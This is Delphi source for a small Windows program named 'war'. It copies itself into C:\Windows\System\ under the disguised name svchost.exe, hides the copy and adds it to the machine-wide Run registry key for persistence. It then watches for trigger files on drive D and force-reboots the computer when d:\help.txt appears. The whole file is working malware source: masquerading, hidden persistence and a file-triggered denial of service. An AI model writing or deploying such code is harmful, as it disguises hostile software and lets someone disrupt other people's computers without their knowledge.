program war;

{$APPTYPE CONSOLE}

uses
  Messages, Windows, SysUtils, shellapi, registry, forms, Dialogs;

const
  path = 'C:\Windows\System\';
  exename = 'svchost.exe';
  regname = 'svchost';

procedure DoAppToRun(RunName, AppName: string);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', True);
    WriteString(RunName, AppName);
    CloseKey;
    Free;
  end;
end;

function IsAppInRun(RunName: string): Boolean;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
    Result := ValueExists(RunName);
    CloseKey;
    Free;
  end;
end;

function CopyToPath: Boolean;
var
  pstr: string;
  temp: string;
begin
  pstr := application.ExeName;
  if pstr = path+exename then
    result := true
  else
  begin
    if not DirectoryExists(path) then
      mkdir(path);
    copyfile(pchar(pstr), path+exename, true);
    FileSetAttr(path+exename, faHidden);
    shellexecute(0, 'open', path+exename, '', path, 0);
    result := false;
  end;
end;

var
  work: boolean = true;
  f: textfile;
begin
  if CopyToPath = true then
  begin
    if not IsAppInRun(regname) then
      DoAppToRun(regname, path+exename);

    while work do
    begin
      if FileExists('d:\help.txt') then
      begin
        DeleteFile('d:\help.txt');
//        assignfile(f, 'd:\1.txt');
//        append(f);
//        Writeln(f, 'hello');
//        closefile(f);
        // all motherfucker code there
        shellexecute(0, 'open', 'c:\windows\system32\shutdown.exe', '/r /f /t 1', path, 0);
      end;

      if FileExists('d:\stop.txt') then
      begin
        DeleteFile('d:\stop.txt');

//        assignfile(f, 'd:\1.txt');
//        Append(f);
//        Writeln(f, 'stop');
//        closefile(f);

        work := false;
        exit;
      end;

      sleep(60000);
    end;
  end;
end.
